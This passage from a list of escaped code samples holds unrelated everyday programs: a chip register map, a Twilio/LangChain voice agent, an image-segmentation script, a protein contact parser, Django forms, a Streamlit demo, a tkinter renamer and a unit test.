'TYPEB',\n    0x07: 'TYPEBF',\n    0x08: 'NFCIP1',\n    0x09: 'STREAM',\n    0x0A: 'AUX',\n# Receiver configuration\n    0x0B: 'RXCFG1',\n    0x0C: 'RXCFG2',\n    0x0D: 'RXCFG3',\n    0x0E: 'RXCFG4',\n# Timer definition\n    0x0F: 'MSKRXTIM',\n    0x10: 'NRESPTIM1',\n    0x11: 'NRESPTIM2',\n    0x12: 'TIMEMV',\n    0x13: 'GPTIM1',\n    0x14: 'GPTIM2',\n    0x15: 'PPON2',\n# Interrupt and associated reporting\n    0x16: 'MSKMAINIRQ',\n    0x17: 'MSKTIMNFCIRQ',\n    0x18: 'MSKERRWAKEIRQ',\n    0x19: 'TARGIRQ',\n    0x1A: 'MAINIRQ',\n    0x1B: 'TIMNFCIRQ',\n    0x1C: 'ERRWAKEIRQ',\n    0x1D: 'TARGIRQ',\n    0x1E: 'FIFOSTAT1',\n    0x1F: 'FIFOSTAT2',\n    0x20: 'COLLDISP',\n    0x21: 'TARGDISP',\n# Definition of number of transmitted bytes\n    0x22: 'NBTXB1',\n    0x23: 'NBTXB2',\n    0x24: 'BITRATEDET',\n# A/D converter output\n    0x25: 'ADCONVOUT',\n# Antenna calibration\n    0x26: 'ANTTUNECTRL1',\n    0x27: 'ANTTUNECTRL2',\n# Antenna driver and modulation\n    0x28: 'TXDRV',\n    0x29: 'TARGMOD',\n# External field detector threshold\n    0x2A: 'EXTFIELDON',\n    0x2B: 'EXTFIELDOFF',\n# Regulator\n    0x2C: 'REGVDDCTRL',\n# Receiver state display\n    0x2D: 'RSSIDISP',\n    0x2E: 'GAINSTATE',\n# Capacitive sensor\n    0x2F: 'CAPACTRL',\n    0x30: 'CAPADISP',\n# Auxiliary display\n    0x31: 'AUXDISP',\n# Wake-up\n    0x32: 'WAKETIMCTRL',\n    0x33: 'AMPCFG',\n    0x34: 'AMPREF',\n    0x35: 'AMPAAVGDISP',\n    0x36: 'AMPDISP',\n    0x37: 'PHASECFG',\n    0x38: 'PHASEREF',\n    0x39: 'PHASEAAVGDISP',\n    0x3A: 'PHASEDISP',\n    0x3B: 'CAPACFG',\n    0x3C: 'CAPAREF',\n    0x3D: 'CAPAAAVGDISP',\n    0x3E: 'CAPADISP',\n# IC identity\n    0x3F: 'ICIDENT',\n## ST25R3916 Datasheet DS12484 Rev ",
    "import base64\nimport os\nimport json\nimport logging\nfrom flask import Flask, render_template\nfrom flask_sock import Sock\nfrom twilio.rest import Client\nfrom twilio.twiml.voice_response import VoiceResponse\nfrom langchain_google_genai import ChatGoogleGenerativeAI\nfrom transcription import SpeechClientBridge\nfrom google.cloud.speech import RecognitionConfig, StreamingRecognitionConfig\nimport threading\nfrom langchain_core.prompts import ChatPromptTemplate\nfrom langchain_google_vertexai import ChatVertexAI\n\n\n\napp = Flask(__name__)\nsockets = Sock(app)\n\nHTTP_SERVER_PORT = 5000\nTIWILIO_SAMPLE_RATE = 800  # Hz\n\n# Twilio configuration\naccount_sid = os.environ['TWILIO_ACCOUNT_SID']\nauth_token = os.environ['TWILIO_AUTH_TOKEN']\nclient = Client(account_sid, auth_token)\nTWILIO_NUMBER=os.environ['TWILIO_NUMBER']\n\n# Google configuration\nGOOGLE_PROJECT_ID = os.environ['GOOGLE_PROJECT_ID']\nGOOGLE_API_KEY=os.environ['GOOGLE_API_KEY']\nGOOGLE_LANGUAGE_CODE = 'en-US'\n\n\n# Flask settings\nPORT = 5000\nDEBUG = False\nINCOMING_CALL_ROUTE = '/'\n\n# LangChain Google Generative AI setup\nllm = ChatGoogleGenerativeAI(model=\"gemini-pro\", google_api_key=GOOGLE_API_KEY)\n\nconfig = RecognitionConfig(\n    encoding=RecognitionConfig.AudioEncoding.MULAW,\n    sample_rate_hertz=8000,\n    language_code=\"en-US\",\n)\nstreaming_config = StreamingRecognitionConfig(config=config, interim_results=True)\n\n\n@app.route(\"/twiml\", methods=[\"POST\"])\ndef return_twiml():\n    print(\"POST TwiML\")\n    return render_template(\"streams.xml\")\n\n\ndef on_transcription_response(response):\n    transcription = \"\"  # Define response2 outside the loop\n\n    if not response.results:\n        return\n\n    result = response.results[0]\n    if not result.alternatives:\n        return\n    \n    for result in response.results:\n        if result.is_final:\n            transcription = result.alternatives[0].transcript\n            print(\"Transcription: \" + transcription)\n            chat(transcription)\n    \n\ndef chat(results):\n    response1=VoiceResponse()\n    system = \"You are a helpful virtual agent who helps keep track of how the patient feels\"\n    human_message = f'{results}'\n\n    # Create a ChatPromptTemplate with system and human messages\n    prompt = ChatPromptTemplate.from_messages([\n        (\"system\", system),\n        (\"human\", human_message)\n    ])\n\n\n    chat = ChatVertexAI(project=GOOGLE_PROJECT_ID, temperature=0.7)\n\n    chain = prompt | chat\n\n    for chunk in chain.stream({}):\n        print(chunk.content)\n        response1.say(chunk.content)\n\n@sockets.route('/realtime')\ndef handle_media(ws):\n    \"\"\"Handles incoming media (audio) data from the Twilio call over a WebSocket connection.\"\"\"\n    app.logger.info(\"Connection accepted\")\n    bridge = SpeechClientBridge(streaming_config, on_transcription_response)\n    t = threading.Thread(target=bridge.start)\n    t.start()\n\n    while True:\n        message = ws.receive()\n        if message is None:\n            bridge.add_request(None)\n            bridge.terminate()\n            break\n\n        data = json.loads(message)\n        match data['event']:\n            case \"connected\":\n                print('twilio connected')\n                continue\n            case \"start\":\n                print('twilio started')\n                continue\n            case \"media\": \n                payload_b64 = data['media']['payload']\n                chunk = base64.b64decode(payload_b64)\n                bridge.add_request(chunk)\n            case \"stop\":\n                print('twilio stopped')\n                break\n\n    bridge.terminate()\n    print(\"WS connection closed\")\n\n@app.route('/', methods=['GET', 'POST'])\ndef make_call(phone_number=\"+12403980310\"):\n    \"\"\"Initiates an outbound call using Twilio.\"\"\"\n    # Generate the TwiML to connect the call to the WebSocket for media handling\n    twiml = f\"\"\"\n    <Response>\n        <Say>\n            What is your name?\n        </Say>\n        <Connect>\n            <Stream url=\"wss://86ec-2601-282-1d80-7b00-9d88-8f2b-fc90-fd27.ngrok-free.app/realtime\" />\n        </Connect>\n    </Response>\n    \"\"\".strip()\n\n    # Make the outbound call\n    call = client.calls.create(\n        twiml=twiml,\n        from_=TWILIO_NUMBER,\n        to=phone_number,\n    )\n    return str(call.sid)\n\nmake_call(\"+12403980310\")  # Uncomment this line to make the call when the application is run\n\nif __name__ == '__main__':\n    app.logger.setLevel(logging.DEBUG)\n    app.run(port=PORT, debug=DEBUG)\n",
    "import os\nimport numpy as np\nfrom PIL import Image\nimport paddle.inference as paddle_infer\nimport cv2\n\n# 1. \u521b\u5efa PaddlePredictor\nmodel_file = \"inference_model_v4/model.pdmodel\"\nparams_file = \"inference_model_v4/model.pdiparams\"\nconfig = paddle_infer.Config(model_file, params_file)\nconfig.disable_gpu()  # \u5982\u679c\u6ca1\u6709 GPU, \u53ef\u4ee5\u4f7f\u7528 config.disable_gpu()\npredictor = paddle_infer.create_predictor(config)\n\n\n# 2. \u5b9a\u4e49\u989c\u8272\u6620\u5c04\ncmap = {0: (255, 0, 0), 1: (0, 255, 0), 2: (0, 0, 255)}  # \u80cc\u666f-\u7ea2\u8272, \u8db3\u90e8-\u7eff\u8272, \u8db3\u5f13-\u84dd\u8272\n\n\n# 3. \u5faa\u73af\u8bfb\u53d6\u56fe\u7247\u5e76\u8fdb\u884c\u63a8\u7406\nimage_dir = \"foot_data/foot_test/\"\nfor filename in os.listdir(image_dir):\n    if filename.endswith(\".jpg\"):\n        # 3.1 \u51c6\u5907\u8f93\u5165\u6570\u636e\n        image = Image.open(os.path.join(image_dir, filename))\n        image = image.resize((640, 360))\n        image = np.array(image)\n        input_data = image.transpose(2, 0, 1)[np.newaxis, :].astype(\"float32\")\n        mean = np.array([0.485, 0.456, 0.406]).reshape(1, 3, 1, 1)\n        std = np.array([0.229, 0.224, 0.225]).reshape(1, 3, 1, 1)\n        input_data = ((input_data / 255.0 - mean) / std).astype(\"float32\")\n\n        # 3.2 \u8bbe\u7f6e\u8f93\u5165\u6570\u636e\n        input_handle = predictor.get_input_handle(predictor.get_input_names()[0])\n        input_handle.reshape([1, 3, 360, 640])\n        input_handle.copy_from_cpu(input_data)\n\n        # 3.3 \u6267\u884c\u9884\u6d4b\n        predictor.run()\n\n        # 3.4 \u83b7\u53d6\u8f93\u51fa\u6570\u636e\n        output_handle = predictor.get_output_handle(predictor.get_output_names()[0])\n        output_data = output_handle.copy_to_cpu()\n\n        # 3.5 \u5904\u7406\u5206\u5272\u7ed3\u679c\n        original_image = cv2.imread(os.path.join(image_dir, filename))\n        original_image = cv2.resize(original_image, (640, 360))\n        segmentation_map = output_data[0].astype(int)\n        segmentation_image = np.zeros((360, 640, 3), dtype=np.uint8)\n        for i in range(360):\n            for j in range(640):\n                segmentation_image[i, j] = cmap[segmentation_map[i, j]]\n\n        # 3.6 \u5c06\u5206\u5272\u7ed3\u679c\u53e0\u52a0\u5230\u539f\u59cb\u56fe\u50cf\u4e0a\n        alpha = 0.5\n        blended_image = cv2.addWeighted(original_image, 1 - alpha, segmentation_image, alpha, 0)\n\n        # 3.7 \u6dfb\u52a0\u7c7b\u522b\u6807\u7b7e\n        for i in range(3):\n            x, y = 10, 30 + i * 30\n            cv2.putText(blended_image, f\"Class {i}: {cmap[i]}\", (x, y), cv2.FONT_HERSHEY_SIMPLEX, 0.5, (255, 255, 255), 2)\n\n        # 3.8 \u663e\u793a\u7ed3\u679c\n        cv2.imshow(f\"Segmentation Result - {filename}\", blended_image)\n        cv2.waitKey(0)\n        cv2.destroyWindow(f\"Segmentation Result - {filename}\")\n\ncv2.destroyAllWindows()\n",
    "#!/usr/bin/python3\n# Gruppe 03\n# ProgPra WS2324\nimport argparse\nimport math\nimport requests\nimport matplotlib.pyplot as plt\nimport numpy as np\nimport matplotlib.colors as mcolors\n\nATOM_TYPE_POS = (12, 16)\nPOSITION = (22, 26)\nCHAIN_POS = 21\nAA_POS = (17, 20)\nX_COORD = (30, 38)\nY_COORD = (38, 46)\nZ_COORD = (46, 54)\nAA_ID = (22, 26)\nATOM_ID = (6, 11)\nHELIX_SEQ_START = (21, 25)\nHELIX_SEQ_END = (33, 37)\nHELIX_CHAIN = 19\nSHEET_SEQ_START = (22, 26)\nSHEET_SEQ_END = (33, 37)\nSHEET_CHAIN = 21\n\nAA_DICT = {\n    \"ALA\": \"A\", \"ARG\": \"R\", \"ASN\": \"N\", \"ASP\": \"D\", \"CYS\": \"C\",\n    \"GLU\": \"E\", \"GLN\": \"Q\", \"GLY\": \"G\", \"HIS\": \"H\", \"ILE\": \"I\",\n    \"LEU\": \"L\", \"LYS\": \"K\", \"MET\": \"M\", \"PHE\": \"F\", \"PRO\": \"P\",\n    \"SER\": \"S\", \"THR\": \"T\", \"TRP\": \"W\", \"TYR\": \"Y\", \"VAL\": \"V\"\n}\n\n\ndef get_file_info(id_path, type):\n    \"\"\"\n    Parse PDB File\n    Extract Atom information\n    :return: Dict with the positions of the atoms as keys\n    \"\"\"\n    counter = 0\n    atom_info = {}\n    ss_info = {}\n    with open(id_path, 'r') as pdb_file:\n        for line in pdb_file:\n            if line.startswith('HELIX'):  # Get Secondary Structure-Infos for Helix\n                helix_start = int(line[HELIX_SEQ_START[0]:HELIX_SEQ_START[1]].strip())\n                helix_end = int(line[HELIX_SEQ_END[0]:HELIX_SEQ_END[1]].strip())\n                helix_chain = line[HELIX_CHAIN]\n                ss_info[(helix_chain, helix_start, helix_end)] = {'H'}\n            if line.startswith('SHEET'):  # Get Secondary Structure-Infos for Sheet, else C\n                sheet_start = int(line[SHEET_SEQ_START[0]:SHEET_SEQ_START[1]].strip())\n                sheet_end = int(line[SHEET_SEQ_END[0]:SHEET_SEQ_END[1]].strip())\n                sheet_chain = line[SHEET_CHAIN]\n                ss_info[(sheet_chain, sheet_start, sheet_end)] = {'E'}\n            if line.startswith('ATOM'):  # Extract Atom Info\n                atom_type = line[ATOM_TYPE_POS[0]:ATOM_TYPE_POS[1]].strip()\n                if atom_type == type:  # For Atoms with required Atom Type\n                    chain = line[CHAIN_POS]\n                    position = int(line[POSITION[0]:POSITION[1]].strip())\n                    aa = line[AA_POS[0]:AA_POS[1]].strip()\n                    atom_id = line[ATOM_ID[0]:ATOM_ID[1]]\n                    # Get coordinates\n                    x_coord = float(line[X_COORD[0]:X_COORD[1]])\n                    y_coord = float(line[Y_COORD[0]:Y_COORD[1]])\n                    z_coord = float(line[Z_COORD[0]:Z_COORD[1]])\n                    # Create Atom_info Dict with Atom-Info-Lists as Values:\n                    atom_info[atom_id] = (chain, position, atom_type, aa, x_coord, y_coord, z_coord)\n            if line.startswith('MODEL'):\n                counter += 1\n                if counter == 2:\n                    break\n    max_value = atom_info[list(atom_info.keys())[-1]][1]\n    return atom_info, ss_info, max_value\n\n\ndef calc_distance(atom_i, atom_j):\n    # Read coordinates of both atoms (x1,x2,x3) (y1,y2,y3)\n    i1 = atom_i[4]\n    i2 = atom_i[5]\n    i3 = atom_i[6]\n    j1 = atom_j[4]\n    j2 = atom_j[5]\n    j3 = atom_j[6]\n    # Return Matrixnorm of [x, y]\n    return math.sqrt((j1 - i1) ** 2 + (j2 - i2) ** 2 + (j3 - i3) ** 2)\n\n\ndef get_sec_struct(ss_info, atom_info):\n    \"\"\"\n    :param ss_info with keys (chain name, start_pos, end_pos)\n    :param atom_info of current position\n    :return: current secondary structure\n    \"\"\"\n    for key in ss_info:\n        if key[0] == atom_info[0] and key[1] <= atom_info[1] <= key[2]:\n            if ss_info[key] == {'H'}:\n                return 'H'\n            else:\n                return 'E'\n    return 'C'\n\n\ndef calc_contacts(atom_info, distance, seq_length, ss_info):\n    \"\"\"\n    Calculate contacts between aas based on given distance.\n    :return: Dict, containing contact info for each aa\n    \"\"\"\n    contacts = {}\n    matches = {}\n    distance_dict = {}\n    atom_id = list(atom_info.keys())\n    for i, pos_i in enumerate(atom_id):\n        contacts[(pos_i,)] = {'chain': atom_info[pos_i][0],\n                              'pos': atom_info[pos_i][1],\n                              'serial': pos_i,\n                              'aa': AA_DICT.get(atom_info[pos_i][3], 'X'),\n                              'ss': get_sec_struct(ss_info, atom_info[pos_i]),\n                              'global': 0,\n                              'local': 0\n                              }\n        for j in range(0, len(atom_id)):\n            if i == j:\n                continue\n            pos_j = atom_id[j]\n            this_distance = calc_distance(atom_info[pos_i], atom_info[pos_j])\n            distance_dict[(atom_info[pos_i][0], atom_info[pos_i][1]), (atom_info[pos_j][0], atom_info[pos_j][1])] = this_distance\n            if this_distance < distance:\n                matches[atom_info[pos_i][1], atom_info[pos_j][1]] = 1\n                if abs(atom_info[pos_i][1] - atom_info[pos_j][1]) < seq_length and atom_info[pos_i][0] == \\\n                        atom_info[pos_j][0]:\n                    contacts[(pos",
    "from crispy_forms.helper import FormHelper\nfrom crispy_forms.layout import Submit\nfrom multiupload.fields import MultiFileField\nfrom .models import Book, Members, Transactions\nfrom django import forms\n\n\nclass MemberForm(forms.ModelForm):\n    class Meta:\n        model = Members\n        fields = [\"name\", \"email\", \"phone\", \"balance\"]\n        labels = {\n            \"name\": \"Member Name\",\n            \"email\": \"Email\",\n            \"phone\": \"Phone Number\",\n            \"balance\": \"Balance\",\n        }\n\n\nclass UpdateMemberForm(forms.ModelForm):\n    class Meta:\n        model = Members\n        fields = [\"name\", \"email\", \"phone\", \"balance\"]\n        labels = {\n            \"name\": \"Member Name\",\n            \"email\": \"Email\",\n            \"phone\": \"Phone Number\",\n            \"balance\": \"Balance\",\n        }\n\n\nclass BookForm(forms.ModelForm):\n    class Meta:\n        model = Book\n        fields = [\"title\", \"author\", \"stock\", \"price\", \"year\", \"book\"]\n        books = MultiFileField(min_num=1, max_num=10, max_file_size=1024 * 1024 * 5)\n        labels = {\n            \"title\": \"Book Title\",\n            \"author\": \"Author\",\n            \"stock\": \"Quantity\",\n            \"price\": \"Price in Ksh.\",\n            \"year\": \"Year of Publication\",\n            \"book\": \"Book\",\n        }\n\n\nclass UpdateBookForm(forms.ModelForm):\n    class Meta:\n        model = Book\n        fields = [\"title\", \"author\", \"stock\", \"price\", \"year\", \"book\"]\n        labels = {\n            \"title\": \"Book Title\",\n            \"author\": \"Author\",\n            \"stock\": \"Quantity\",\n            \"price\": \"Price in Ksh.\",\n            \"year\": \"Year of Publication\",\n            \"book\": \"Book\",\n        }\n\n\nclass IssueBookForm(forms.Form):\n    book_id = forms.IntegerField()\n\n\nclass ReturnBookForm(forms.Form):\n    transaction_id = forms.IntegerField()\n",
    "# Copyright (c) Streamlit Inc. (2018-2022) Snowflake Inc. (2022)\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n\nfrom typing import Any\n\nimport numpy as np\n\nimport streamlit as st\nfrom streamlit.hello.utils import show_code\n\n\ndef animation_demo() -> None:\n\n    # Interactive Streamlit elements, like these sliders, return their value.\n    # This gives you an extremely simple interaction model.\n    iterations = st.sidebar.slider(\"Level of detail\", 2, 20, 10, 1)\n    separation = st.sidebar.slider(\"Separation\", 0.7, 2.0, 0.7885)\n\n    # Non-interactive elements return a placeholder to their location\n    # in the app. Here we're storing progress_bar to update it later.\n    progress_bar = st.sidebar.progress(0)\n\n    # These two elements will be filled in later, so we create a placeholder\n    # for them using st.empty()\n    frame_text = st.sidebar.empty()\n    image = st.empty()\n\n    m, n, s = 960, 640, 400\n    x = np.linspace(-m / s, m / s, num=m).reshape((1, m))\n    y = np.linspace(-n / s, n / s, num=n).reshape((n, 1))\n\n    for frame_num, a in enumerate(np.linspace(0.0, 4 * np.pi, 100)):\n        # Here were setting value for these two elements.\n        progress_bar.progress(frame_num)\n        frame_text.text(\"Frame %i/100\" % (frame_num + 1))\n\n        # Performing some fractal wizardry.\n        c = separation * np.exp(1j * a)\n        Z = np.tile(x, (n, 1)) + 1j * np.tile(y, (1, m))\n        C = np.full((n, m), c)\n        M: Any = np.full((n, m), True, dtype=bool)\n        N = np.zeros((n, m))\n\n        for i in range(iterations):\n            Z[M] = Z[M] * Z[M] + C[M]\n            M[np.abs(Z) > 2] = False\n            N[M] = i\n\n        # Update the image placeholder by calling the image() function on it.\n        image.image(1.0 - (N / N.max()), use_column_width=True)\n\n    # We clear elements by calling empty on them.\n    progress_bar.empty()\n    frame_text.empty()\n\n    # Streamlit widgets automatically run the script from top to bottom. Since\n    # this button is not connected to any other logic, it just causes a plain\n    # rerun.\n    st.button(\"Re-run\")\n\n\nst.set_page_config(page_title=\"Animation Demo\", page_icon=\"\ud83d\udcf9\")\nst.markdown(\"# Animation Demo\")\nst.sidebar.header(\"Animation Demo\")\nst.write(\n    \"\"\"This app shows how you can use Streamlit to build cool animations.\nIt displays an animated fractal based on the the Julia Set. Use the slider\nto tune different parameters.\"\"\"\n)\n\nanimation_demo()\n\nshow_code(animation_demo)\n",
    "# Scenario\n# Let's visit a very special place - a plane with the Cartesian coordinate system (you can learn more about this concept here: https://en.wikipedia.org/wiki/Cartesian_coordinate_system).\n\n# Each point located on the plane can be described as a pair of coordinates customarily called x and y. We expect that you are able to write a Python class which stores both coordinates as float numbers. Moreover, we want the objects of this class to evaluate the distances between any of the two points situated on the plane.\n\n# The task is rather easy if you employ the function named hypot() (available through the math module) which evaluates the length of the hypotenuse of a right triangle (more details here: https://en.wikipedia.org/wiki/Hypotenuse) and here: https://docs.python.org/3.7/library/math.html#trigonometric-functions.\n\n# This is how we imagine the class:\n\n# it's called Point;\n# its constructor accepts two arguments (x and y respectively), both default to zero;\n# all the properties should be private;\n# the class contains two parameterless methods called getx() and gety(), which return each of the two coordinates (the coordinates are stored privately, so they cannot be accessed directly from within the object);\n# the class provides a method called distance_from_xy(x,y), which calculates and returns the distance between the point stored inside the object and the other point given as a pair of floats;\n# the class provides a method called distance_from_point(point), which calculates the distance (like the previous method), but the other point's location is given as another Point class object;\n# Complete the template we've provided in the editor and run your code and check whether your output looks the same as ours.\n\n################################################################################################\n\n# Code\n# import math\n\n\n# class Point:\n#     def __init__(self, x=0.0, y=0.0):\n#         #\n#         # Write code here\n#         #\n\n#     def getx(self):\n#         #\n#         # Write code here\n#         #\n\n#     def gety(self):\n#         #\n#         # Write code here\n#         #\n\n#     def distance_from_xy(self, x, y):\n#         #\n#         # Write code here\n#         #\n\n#     def distance_from_point(self, point):\n#         #\n#         # Write code here\n#         #\n\n\n# point1 = Point(0, 0)\n# point2 = Point(1, 1)\n# print(point1.distance_from_point(point2))\n# print(point2.distance_from_xy(2, 0))\n\n\n################################################################################################\n\n# Expected output\n# 1.4142135623730951\n# 1.4142135623730951\n\n################################################################################################\nimport math\n\n\nclass Point:\n    def __init__(self, x=0.0, y=0.0):\n        self.__x = x\n        self.__y = y\n\n    def getx(self):\n        return self.__x\n\n    def gety(self):\n        return self.__y\n\n    def distance_from_xy(self, x, y):\n        return math.hypot(self.__x - x, self.__y - y)\n\n    def distance_from_point(self, point):\n        return math.hypot(self.__x - point.getx(), self.__y - point.gety())\n\n\npoint1 = Point(0, 0)\npoint2 = Point(1, 1)\nprint(point1.distance_from_point(point2))\nprint(point2.distance_from_xy(2, 0))\n",
    "#! /usr/bin/env nix-shell\n#! nix-shell -i python3 -p python3Packages.marimo python3Packages.flask python3Packages.matplotlib\n\nimport marimo\nfrom flask import Flask, request, jsonify\n\nimport re\nimport os\n\nfrom marimo._ast import codegen\nfrom marimo._ast.cell import CellConfig\nimport tempfile\n\nfrom marimo._output.formatters.formatters import (\n    register_formatters,\n)\nfrom marimo._output.formatting import try_format\nimport marimo as mo\n\n# Maybe do over sockets instead of web?\n# Feels very hacky\n\napp = Flask(__name__)\n\n# Just need globals\nsources = {}\nlookups = {}\n\n\n@app.route(\"/run\", methods=[\"POST\"])\ndef run():\n    data = request.get_json()\n    code = data.get(\"code\", None)\n    key = data.get(\"key\", None).strip()\n    print(\"run\", key, code)\n    if code is None or key is None:\n        return jsonify({\"error\": \"No code provided\"}), 400\n    sources[key] = code\n    return \"\"\n\n\n@app.route(\"/lookup\", methods=[\"POST\"])\ndef lookup():\n    data = request.get_json()\n    key = data.get(\"key\", None).strip()\n    if key is None or key not in lookups:\n        return jsonify({\"type\": \"html\", \"value\": \"error: No key provided\"}), 400\n    if lookups[key] is None:\n        return jsonify({\"type\": \"html\", \"value\": \"\"})\n\n    data = lookups[key]\n    output = try_format(data)\n    # Ideally handle this client side, but just a sanity check\n    if output.mimetype == \"image/png\":\n        return jsonify({\"type\": \"figure\", \"value\": f\"{output.data}\"})\n\n    # Default to whatever the output was, assuming html\n    return jsonify({\"type\": \"html\", \"value\": f\"{mo.as_html(data)}\"})\n\n\n@app.route(\"/execute\", methods=[\"GET\"])\ndef execute():\n\n    keys, code = list(zip(*sources.items()))\n    generated = codegen.generate_filecontents(\n        code,\n        keys,\n        [CellConfig() for _ in range(len(sources))],\n    )\n    with tempfile.NamedTemporaryFile(mode=\"w\", suffix=\".py\") as f:\n        f.write(generated)\n        f.seek(0)\n        app = codegen.get_app(f.name)\n\n    register_formatters()\n    for key, output in zip(keys, app.run()[0]):\n        lookups[key] = output\n    return \"\"\n\n\n@app.route(\"/flush\", methods=[\"GET\"])\ndef flush():\n    lookups.clear()\n    sources.clear()\n    return \"\"\n\n\n@app.route(\"/assets\", methods=[\"GET\"])\ndef assets():\n    # Read the HTML file\n    with open(f\"{marimo.__path__[0]}/_static/index.html\", \"r\") as file:\n        html_content = file.read()\n    (js,) = re.findall(r\"index-.*\\.js\", html_content)\n    (css,) = re.findall(r\"index-.*\\.css\", html_content)\n    base = f\"https://cdn.jsdelivr.net/npm/@marimo-team/frontend@{marimo.__version__}/dist/assets/\"\n    dev_server = os.environ.get(\"QUARTO_MARIMO_DEBUG_ENDPOINT\")\n    js = f\"{base}{js}\"\n    if dev_server:\n        js = f\"http://{dev_server}/src/main.tsx\"\n    return f\"\"\"\n      <div id=\"root\" style=\"display:none\"></div>\n      <marimo-mode data-mode=\"read\" hidden=\"\"></marimo-mode>\n      <marimo-filename hidden=\"\">quarto app</marimo-filename>\n      <marimo-version data-version=\"{marimo.__version__}\" hidden=\"\"></marimo-version>\n      <marimo-user-config data-config=\"{{}}\" hidden=\"\"> </marimo-user-config>\n      <marimo-app-config data-config=\"{{}}\"> </marimo-app-config>\n      <script data-marimo=\"true\">\n        window.__MARIMO_STATIC__ = {{}};\n        window.__MARIMO_STATIC__.version = \"{marimo.__version__}\";\n        window.__MARIMO_STATIC__.notebookState = {{}};\n        window.__MARIMO_STATIC__.assetUrl = \"{base}\";\n        window.__MARIMO_STATIC__.files = {{}};\n      </script>\n\n      <marimo-code hidden=\"\">\n      </marimo-code>\n\n      <link rel=\"stylesheet\" crossorigin=\"anonymous\" href=\"{base}{css}\">\n      <script type=\"module\" crossorigin=\"anonymous\" src=\"{js}\"></script>\n  \"\"\"\n\n\nif __name__ == \"__main__\":\n    app.run(debug=True, port=6000)\n",
    "import os\nimport tkinter as tk\nfrom tkinter import filedialog, messagebox\nimport locale\n\nlanguage, _ = locale.getdefaultlocale()\nif language == \"ja_JP\":\n    from ms_ja import *\nelse:\n    from ms_us import *\n\nclass FileRenamer(tk.Tk):\n    def __init__(self):\n        super().__init__()\n        self.title(\"File Renamer\")\n\n        self.select_label = tk.Label(self, text=dt_root_ms)\n        self.select_label.pack()\n\n        self.file_listbox = tk.Listbox(self, width=80, height=10)\n        self.file_listbox.pack()\n\n        self.rename_button = tk.Button(self, text=dt_root_text, command=self.rename_file)\n        self.rename_button.pack(pady=20)\n\n    def rename_file(self):\n        file_paths = filedialog.askopenfilenames()\n        if file_paths:\n            self.update_file_listbox(file_paths)\n\n        name_input = self.get_multiline_input(\"Rename File\", ms_newnames)\n        if name_input is None:\n            messagebox.showwarning(\"Error\", ms_noinput)\n            return\n\n        new_filenames = name_input.split('\\n')\n        if len(file_paths) != len(new_filenames):\n            messagebox.showwarning(\"Error\", ms_dontmatch)\n            return\n\n        self.renamed_files = []\n        for file_path, new_name in zip(file_paths, new_filenames):\n            dir, old_name_e = os.path.split(file_path)\n            _, extension = os.path.splitext(old_name_e)\n            old_path = file_path\n            new_name_e = new_name.strip() + extension\n            new_path = os.path.join(dir, new_name_e)\n            os.rename(old_path, new_path)\n            self.renamed_files.append((old_name_e, new_name_e))\n\n        messagebox.showinfo(\"Success\", ms_success)\n        self.show_renamed_files(self.renamed_files)\n\n    def update_file_listbox(self, file_paths):\n        self.file_listbox.delete(0, tk.END)\n        for file_path in file_paths:\n            _, filename_e = os.path.split(file_path)\n            filename, _ = os.path.splitext(filename_e)\n            self.file_listbox.insert(tk.END, filename)\n\n    def get_multiline_input(self, title, prompt):\n        dialog = tk.Toplevel(self)\n        dialog.title(title)\n        label = tk.Label(dialog, text=prompt)\n        label.pack()\n        text_widget = tk.Text(dialog, width=50, height=10)\n        text_widget.pack()\n        result = None\n        button_frame = tk.Frame(dialog)\n        button_frame.pack()\n\n        def ok_click():\n            nonlocal result\n            result = text_widget.get(\"1.0\", tk.END).strip()\n            dialog.destroy()\n\n        ok_button = tk.Button(button_frame, text=\"OK\", command=ok_click)\n        ok_button.pack(side=tk.LEFT)\n        cancel_button = tk.Button(button_frame, text=\"Cancel\", command=dialog.destroy)\n        cancel_button.pack(side=tk.LEFT)\n        dialog.wait_window()\n        return result\n\n    def show_renamed_files(self, files):\n        dialog = tk.Toplevel()\n        dialog.title(dt_top)\n        label = tk.Label(dialog, text=dt_top_text)\n        label.pack()\n        listbox = tk.Listbox(dialog, width=80, height=10)\n        for old_path, new_path in files:\n            listbox.insert(tk.END, f\"{old_path} -> {new_path}\")\n        listbox.pack()\n        close_button = tk.Button(dialog, text=\"Close\", command=dialog.destroy)\n        close_button.pack()\n\nif __name__ == \"__main__\":\n    app = FileRenamer()\n    app.mainloop()",
    "from PIL import Image\nimport unittest\nimport numpy as np # pip install numpy\nimport textrecognizer\n\nclass TestTextRecognizer(unittest.TestCase):\n    def test_recognize_text_from_image(self):\n        # Create a simple white image with PIL\n        img = Image.new('RGB', (60, 30), color = (73, 109, 137))\n\n        # Write some text on the image\n        d = ImageDraw.Draw(img)\n        d.text((10,10), \"Hello\", fill=(255, 255, 255))\n\n        # Convert the PIL image to a numpy array\n        img_array = np.array(img)\n\n        # Call the function with the numpy array\n        result = textrecognizer.recognize_text_from_image(img_array)\n\n        # Check that the result is the expected text\n        self.assertEqual(result, \"Hello\")\n\n    def test_recognize_text_from_image_empty(self):\n        # Create an empty white image with PIL\n        img = Image.new('RGB', (60, 30), color = (73, 109, 137))\n\n        # Convert the PIL image to a numpy array\n        img_array = np.array(img)\n\n        # Call the function with the numpy array\n        result = textrecognizer.recognize_text_from_image(img_array)\n\n        # Check that the result is an empty string\n        self.assertEqual(result, \"\")\n\nif __name__ == '__main__':\n    unittest.main()",
